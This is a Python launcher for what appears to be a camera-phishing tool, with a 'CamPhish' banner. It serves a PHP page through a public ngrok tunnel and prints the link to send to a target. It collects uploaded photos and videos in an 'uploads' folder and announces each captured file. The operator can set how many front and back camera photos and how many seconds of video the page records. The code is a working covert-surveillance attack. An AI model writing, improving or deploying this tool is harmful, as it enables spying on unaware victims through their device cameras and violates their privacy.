import subprocess,time,re,shutil,sys,os,random
from datetime import datetime
try:
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
except:
    os.system('pip install watchdog')
try:
    from colorama import init,Fore
except:
    os.system('pip install colorama')

init()  


colors = {
    "red": '\033[00;31m',
    "green": '\033[00;32m',
    "light_green": '\033[01;32m',
    "yellow": '\033[01;33m',
    "light_red": '\033[01;31m',
    "blue": '\033[94m',
    "purple": '\033[01;35m',
    "cyan": '\033[00;36m',
    "grey": '\033[90m',
    "reset": Fore.RESET,
}

messages = {
    "true": f"{colors['red']}[{colors['light_green']}+{colors['red']}] {colors['light_green']}",
    "forindex": f"{colors['red']}[{colors['green']}?{colors['red']}] {colors['green']}",
    "error": f"{colors['red']}[{colors['light_red']}-{colors['red']}] {colors['light_red']}"
}

PHP_PORT = random.randint(8000,8999)
PHP_FOLDER = "./"  
FOLDER_TO_WATCH = "uploads"
INDEX = "index.html"
TOKEN_FILE = "token.txt"
# -------------------------------------------------------------------

def clear():
    os.system("cls || clear")

def OS():
    return os.path.exists("/data/data/com.termux")

clear()

if not shutil.which("php"):
    if OS():
        subprocess.run(["pkg", "install", "php"])
    elif 'Linux' in __import__("platform").system():
        subprocess.run(["sudo", "apt", "install","php"])
    print(f"\n{messages['error']}Php is NOT installed!\n\nInstall On Windows: https://www.php.net/downloads.php")

if not shutil.which("ngrok"):
    sys.exit(f"\n{messages['error']}ngrok is NOT installed!\n\nInstall On windows: winget install ngrok -s msstore\nOr Download Portable: https://ngrok.com/download/windows?tab=download\n\nInstall On Termux: \npkg update -y\npkg install git\ngit clone https://github.com/Yisus7u7/termux-ngrok\ncd termux-ngrok\nbash install.sh\n\nInstall On Linux: https://ngrok.com/download/linux\n\nAnd then add your token (ngrok config add-authtoken <token>)")

def tokenngrok():
    if os.path.isfile(TOKEN_FILE):
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
        return token if token else None
    
user = os.popen("whoami").read().strip()
os.environ["USER"] = user

if OS():
    os.environ["HOME"] = os.environ.get("HOME") 
    b = f"""{colors['cyan']}                                                                                           
▄█████  ▄▄▄  ▄▄   ▄▄ █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ 
██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 

    {colors['red']}Tg&Git: @Mresfelurm&mr-spect3r{colors['reset']}\n\n                                       
"""
else:
    if 'Linux' in __import__("platform").system():
        os.environ["HOME"] = f"/home/{user}"
    b = f"""{colors['cyan']}
       _..._                                                                                          
    .-'_..._''.                                                                                       
  .' .'      '.\          __  __   ___  _________   _...._        .        .--.           .           
 / .'                    |  |/  `.'   `.\        |.'      '-.   .'|        |__|         .'|           
. '                      |   .-.  .-.   '\        .'```'.    '.<  |        .--.        <  |           
| |                 __   |  |  |  |  |  | \      |       \     \| |        |  |         | |           
| |              .:--.'. |  |  |  |  |  |  |     |        |    || | .'''-. |  |     _   | | .'''-.    
. '             / |   \ ||  |  |  |  |  |  |      \      /    . | |/.'''. \|  |   .' |  | |/.'''. \   
 \ '.          .`" __ | ||  |  |  |  |  |  |     |\`'-.-'   .'  |  /    | ||  |  .   | /|  /    | |   
  '. `._____.-'/ .'.''| ||__|  |__|  |__|  |     | '-....-'`    | |     | ||__|.'.'| |//| |     | |   
    `-.______ / / /   | |_                .'     '.             | |     | |  .'.'.-'  / | |     | |   
             `  \ \._,\ '/              '-----------'           | '.    | '. .'   \_.'  | '.    | '.  
                 `--'  `"                                       '---'   '---'           '---'   '---' 

                {colors['red']}Tg&Git: @Mresfelurm&mr-spect3r{colors['reset']}\n\n
                 """

print (b)
token = tokenngrok()

if not token:
    user_token = input(f"{messages['true']}Enter Token Ngrok: {colors['reset']}")
    with open(TOKEN_FILE, "w") as f:
        f.write(user_token.strip())
    subprocess.run(["ngrok", "config", "add-authtoken", user_token])

clear()
print (b)

forindex = input(f"{messages['forindex']}Do you want to change the settings of the 'index.html' file? (y/n): {colors['reset']}").upper()

if forindex == "Y":
    front_photo_count = input(f"{messages['forindex']}Front Photo Count {colors['yellow']}(e.g: 3){colors['reset']}: ")
    back_photo_count = input(f"{messages['forindex']}Back Photo Count {colors['yellow']}(e.g: 3){colors['reset']}: ")
    front_video_seconds = input(f"{messages['forindex']}Front Video Seconds {colors['yellow']}(e.g: 5){colors['reset']}: ")
    back_video_seconds = input(f"{messages['forindex']}Back Video Seconds {colors['yellow']}(e.g: 4){colors['reset']}: ")
    patterns = {
        'frontPhotoCount': r'let frontPhotoCount = \d+;',
        'backPhotoCount': r'let backPhotoCount = \d+;',
        'frontVideoSeconds': r'let frontVideoSeconds = \d+;',
        'backVideoSeconds': r'let backVideoSeconds = \d+;'
    }

    with open(INDEX, 'r', encoding='utf-8') as file:
        content = file.read()

    content = re.sub(patterns['frontPhotoCount'], f'let frontPhotoCount = {front_photo_count};', content)
    content = re.sub(patterns['backPhotoCount'], f'let backPhotoCount = {back_photo_count};', content)
    content = re.sub(patterns['frontVideoSeconds'], f'let frontVideoSeconds = {front_video_seconds};', content)
    content = re.sub(patterns['backVideoSeconds'], f'let backVideoSeconds = {back_video_seconds};', content)

    with open(INDEX, 'w', encoding='utf-8') as file:
        file.write(content)
    clear
    print(b)

def php_server():
    print(f"{messages['true']}Starting PHP server on port {colors['yellow']}{PHP_PORT}{colors['reset']}...")
    php_proc = subprocess.Popen(
        ["php", "-S", f"0.0.0.0:{PHP_PORT}"],
        cwd=PHP_FOLDER,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    time.sleep(2)
    return php_proc

def ngrok(port):
    print(f"{messages['true']}Starting ngrok on port {colors['yellow']}{port}{colors['reset']}...")
    ngrok_proc = subprocess.Popen(
        ["ngrok", "http", str(port)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(8)  
    return ngrok_proc

def ngrok_url():
    try:
        result = subprocess.run(
            ['curl', '-s', '-N', 'http://127.0.0.1:4040/api/tunnels'],
            capture_output=True,
            text=True
        )
        output = result.stdout
        matches = re.findall(r"https://[0-9a-z]*\.ngrok-free\.app", output)
        if matches:
            for url in matches:
                print(f"\n{messages['true']}public URL:", url)
            return matches
        else:
            print(f"\n{messages['error']}No ngrok URL found. Use a VPN if you are banned")
            exit()
    except Exception as e:
        print(f"\n{messages['error']}Error:", e)
        return None

class WatcherHandler(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            file_name = os.path.basename(event.src_path)
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"\n{messages['true']}File received: {colors['green']}{file_name} {colors['red']}at {colors['yellow']}{current_time}")

if __name__ == "__main__":

    php_proc = php_server()
    ngrok_proc = ngrok(PHP_PORT)
    ngrok_url()

    event_handler = WatcherHandler()
    observer = Observer()
    observer.schedule(event_handler, FOLDER_TO_WATCH, recursive=False)
    observer.start()
    print(f"\n{messages['true']}Photo capture Started => {colors['yellow']}{FOLDER_TO_WATCH}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{colors['red']}Stopping servers and observer...")
        php_proc.terminate()
        ngrok_proc.terminate()
        observer.stop()

        observer.join()
